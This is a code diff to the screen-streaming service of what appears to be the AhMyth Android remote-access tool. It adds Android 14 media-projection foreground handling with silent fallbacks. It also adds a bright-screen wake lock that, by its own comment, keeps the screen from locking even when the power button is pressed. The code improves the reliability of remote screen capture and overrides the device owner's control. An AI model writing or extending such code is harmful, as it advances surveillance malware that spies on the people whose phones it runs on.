@@ -8,6 +8,7 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.ServiceInfo;
 import android.graphics.Bitmap;
 import android.graphics.PixelFormat;
 import android.hardware.display.DisplayManager;
@@ -20,6 +21,7 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.PowerManager;
 import android.util.Base64;
 import android.util.DisplayMetrics;
 import android.util.Log;
@@ -46,6 +48,7 @@ public class ScreenStreamService extends Service {
     private VirtualDisplay virtualDisplay;
     private ImageReader imageReader;
     private Handler handler;
+    private PowerManager.WakeLock wakeLock;
     
     private int screenWidth;
     private int screenHeight;
@@ -126,7 +129,24 @@ public class ScreenStreamService extends Service {
                 .build();
         }
         
-        startForeground(NOTIFICATION_ID, notification);
+        // On Android 14+ (API 34+), must specify foreground service type
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            // API 34+ requires explicit foreground service type
+            try {
+                startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
+            } catch (SecurityException e) {
+                Log.e(TAG, "Failed to start foreground service with mediaProjection type: " + e.getMessage());
+                // Fallback: try without type (may not work on Android 14+)
+                try {
+                    startForeground(NOTIFICATION_ID, notification);
+                } catch (SecurityException e2) {
+                    Log.e(TAG, "Failed to start foreground service: " + e2.getMessage());
+                    // Service will still run, just not as foreground
+                }
+            }
+        } else {
+            startForeground(NOTIFICATION_ID, notification);
+        }
     }
     
     private void initDisplayMetrics() {
@@ -223,9 +243,71 @@ public class ScreenStreamService extends Service {
             isCapturing = true;
             Log.d(TAG, "Screen capture started");
             
+            // Acquire wake lock to prevent screen lock during streaming
+            acquireWakeLock();
+            
         } catch (Exception e) {
             Log.e(TAG, "Error starting capture", e);
             stopCapture();
+        }
+    }
+    
+    /**
+     * Acquire wake lock to prevent screen from locking during streaming
+     */
+    @SuppressWarnings("deprecation")
+    private void acquireWakeLock() {
+        try {
+            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (powerManager == null) {
+                Log.e(TAG, "Failed to get PowerManager");
+                return;
+            }
+            
+            // Release existing wake lock if any
+            releaseWakeLock();
+            
+            // Use SCREEN_BRIGHT_WAKE_LOCK to keep screen fully on
+            // This prevents screen lock while streaming (even when power button is pressed)
+            // Note: These wake lock types are deprecated but still work
+            // For Android 5.0+, we could use WindowManager with FLAG_KEEP_SCREEN_ON
+            // but that requires SYSTEM_ALERT_WINDOW permission
+            int wakeLockFlags = PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE;
+            
+            wakeLock = powerManager.newWakeLock(wakeLockFlags, "AhMyth::ScreenStreamWakeLock");
+            wakeLock.setReferenceCounted(false);
+            wakeLock.acquire();
+            
+            Log.d(TAG, "Wake lock acquired to prevent screen lock during streaming");
+        } catch (Exception e) {
+            Log.e(TAG, "Error acquiring wake lock", e);
+            // Try fallback with PARTIAL_WAKE_LOCK (keeps CPU awake but not screen)
+            try {
+                PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (powerManager != null) {
+                    wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AhMyth::ScreenStreamWakeLock");
+                    wakeLock.setReferenceCounted(false);
+                    wakeLock.acquire();
+                    Log.d(TAG, "Fallback: PARTIAL_WAKE_LOCK acquired (CPU only, screen may still lock)");
+                }
+            } catch (Exception e2) {
+                Log.e(TAG, "Failed to acquire fallback wake lock", e2);
+            }
+        }
+    }
+    
+    /**
+     * Release wake lock when streaming stops
+     */
+    private void releaseWakeLock() {
+        try {
+            if (wakeLock != null && wakeLock.isHeld()) {
+                wakeLock.release();
+                wakeLock = null;
+                Log.d(TAG, "Wake lock released");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error releasing wake lock", e);
         }
     }
     
@@ -345,6 +427,9 @@ public class ScreenStreamService extends Service {
     
     public void stopCapture() {
         isCapturing = false;
+        
+        // Release wake lock when streaming stops
+        releaseWakeLock();
         
         if (virtualDisplay != null) {
             virtualDisplay.release();
